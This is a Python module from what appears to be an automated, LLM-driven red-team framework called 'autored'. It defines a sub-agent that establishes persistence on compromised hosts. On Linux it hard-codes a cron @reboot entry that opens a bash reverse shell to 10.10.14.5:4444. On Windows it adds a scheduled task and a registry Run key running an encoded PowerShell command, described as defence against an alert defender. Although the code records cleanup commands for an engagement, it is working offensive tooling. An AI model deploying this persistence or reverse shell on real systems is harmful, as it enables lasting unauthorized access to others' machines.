"""PersistenceAgent sub-agent.

Dispatches the appropriate persistence tool(s) based on the foothold's
OS type and collects the resulting :class:`PersistenceArtifact`
records. Each artifact carries a non-empty ``removal_command`` (Review
Focus #3) — the Phase 5 Cleanup Agent runs that command verbatim to
tear the foothold down.

Linux footholds get cron persistence (the simplest reliable method —
the Phase 5 LLM planner will add systemd / SSH-key methods based on
what the enumeration surfaced).

Windows footholds get both a scheduled-task persistence and a
registry Run-key persistence (defence in depth — either alone can be
cleared by an alert defender, but together they cover both logon-time
and reboot-time triggers).

The sub-agent is a thin wrapper around the persistence tool wrappers
added in Phase 4 Task 6 — it doesn't execute anything itself; the
Phase 6 foothold session manager will execute the per-artifact
``command_built`` saved in ``PersistenceArtifact.details``.
"""
from langchain_core.tools import tool
from pydantic import BaseModel, Field

from autored.logging import get_logger
from autored.models.postex import PersistenceArtifact
from autored.tools.persistence import (
    cron_modify,
    reg_modify,
    schtasks_create,
)

log = get_logger("subagents.persistenceagent")


class PersistenceAgentOutput(BaseModel):
    host_ip: str
    artifacts: list[PersistenceArtifact] = Field(default_factory=list)


@tool
async def persistenceagent_subagent(
    foothold: dict,
    os_type: str,
    engagement_id: str = "",
) -> PersistenceAgentOutput:
    """Establish persistence on a foothold.

    Args:
        foothold: Foothold dict with ``host_ip``, ``id`` (foothold_id),
            and ``access_type`` (e.g., "shell").
        os_type: ``"linux"`` or ``"windows"``.
        engagement_id: Current engagement ID.

    Returns:
        PersistenceAgentOutput with one or more PersistenceArtifact
        records. Every artifact has a non-empty ``removal_command``
        that the Phase 5 Cleanup Agent runs verbatim.
    """
    host_ip = foothold["host_ip"]
    foothold_id = foothold["id"]
    log.info(
        "persistenceagent_start",
        host_ip=host_ip, os_type=os_type, foothold_id=foothold_id,
    )

    artifacts: list[PersistenceArtifact] = []

    if os_type == "linux":
        # Cron @reboot persistence — the simplest reliable Linux
        # method. Phase 5 will add systemd / SSH-key based on what
        # the enumeration surfaced.
        result = await cron_modify.ainvoke({
            "schedule": "@reboot",
            "command": "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1",
            "host_ip": host_ip,
            "foothold_id": foothold_id,
            "engagement_id": engagement_id,
        })
        if result.artifact:
            artifacts.append(result.artifact)

    elif os_type == "windows":
        # Defence in depth: scheduled task + registry Run key.
        # Either alone can be cleared by an alert defender, but
        # together they cover both logon-time and reboot-time triggers.
        result1 = await schtasks_create.ainvoke({
            "task_name": "AutoRedUpdate",
            "command": "powershell -enc abc123",
            "trigger": "ONLOGON",
            "host_ip": host_ip,
            "foothold_id": foothold_id,
            "engagement_id": engagement_id,
        })
        if result1.artifact:
            artifacts.append(result1.artifact)

        result2 = await reg_modify.ainvoke({
            "key_path": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "value_name": "AutoRed",
            "value_data": "powershell -enc abc123",
            "host_ip": host_ip,
            "foothold_id": foothold_id,
            "engagement_id": engagement_id,
        })
        if result2.artifact:
            artifacts.append(result2.artifact)

    else:
        log.warning("persistenceagent_unknown_os", os_type=os_type, host_ip=host_ip)

    log.info(
        "persistenceagent_done",
        host_ip=host_ip, os_type=os_type, artifacts=len(artifacts),
    )
    return PersistenceAgentOutput(host_ip=host_ip, artifacts=artifacts)
